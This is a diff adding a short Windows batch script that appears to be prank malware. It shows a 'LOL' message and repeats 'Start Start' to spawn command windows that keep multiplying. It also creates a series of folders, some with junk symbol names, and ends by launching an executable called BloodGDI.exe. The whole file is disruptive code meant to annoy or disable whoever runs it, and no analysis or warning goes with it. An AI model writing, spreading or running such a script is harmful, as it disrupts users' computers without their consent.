@@ -1,0 +1,36 @@
+@echo off Start  
+Notepad  
+Msg* LOL  
+Start Start    
+Start Start    
+Start Start    
+Start Start    
+Start Start    
+Start Start    
+Start Start    
+Start Start    
+Md 1    
+Md 2    
+Md 3     
+Md 4    
+Md 5    
+Md 6    
+Md 7    
+Md 8    
+Md 9    
+Md 10    
+Md 11    
+Md 12    
+Md 13    
+Md 14    
+Md °{®{^€^]¢    
+Md √|π×^}°€    
+Md ¢π×$[√$    
+Md |×√¢{√$    
+Md ¢°{$}^    
+Md ¢°{$=¢=•€    
+Md {°¢}¢°}$}π$    
+Md 1°¢{√$8₺(_7    
+Md ^¢}°¢°§^{$π\€    
+Md ¢°}${°^{¢}°¢{^^×    
+Start BloodGDI.exe
